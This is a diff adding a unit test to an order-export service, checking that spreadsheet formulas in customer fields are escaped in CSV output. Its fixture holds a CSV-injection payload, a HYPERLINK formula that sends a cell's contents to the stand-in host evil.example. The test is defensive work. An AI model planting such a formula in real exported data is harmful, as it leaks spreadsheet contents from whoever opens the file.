@@ -41,6 +41,40 @@ describe('OrdersService admin export csv', () => {
     expect(csv).toContain('"CAPTURED"');
   });
 
+  it('neutralises spreadsheet formulas in customer-controlled fields (CSV injection)', async () => {
+    const fastify = {
+      prisma: {
+        order: {
+          findMany: vi.fn().mockResolvedValue([
+            {
+              orderNumber: 'ORD-2026-00002',
+              status: 'CONFIRMED',
+              total: 100,
+              createdAt: new Date('2026-04-27T00:00:00.000Z'),
+              user: {
+                firstName: '=HYPERLINK("https://evil.example/?d="&B2,"Click")',
+                lastName: '',
+                email: '@evil.example',
+                phone: null
+              },
+              payment: null
+            }
+          ])
+        }
+      }
+    } as unknown as FastifyInstance;
+
+    const service = new OrdersService(fastify);
+    const csv = await service.adminExportOrdersCsv({
+      from: '2026-04-01T00:00:00.000Z',
+      to: '2026-04-30T23:59:59.999Z'
+    });
+
+    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?d=""&B2,""Click"")"`);
+    expect(csv).toContain(`"'@evil.example"`);
+    expect(csv).toContain('"100"');
+  });
+
   it('throws validation error when from is after to', async () => {
     const fastify = {
       prisma: {
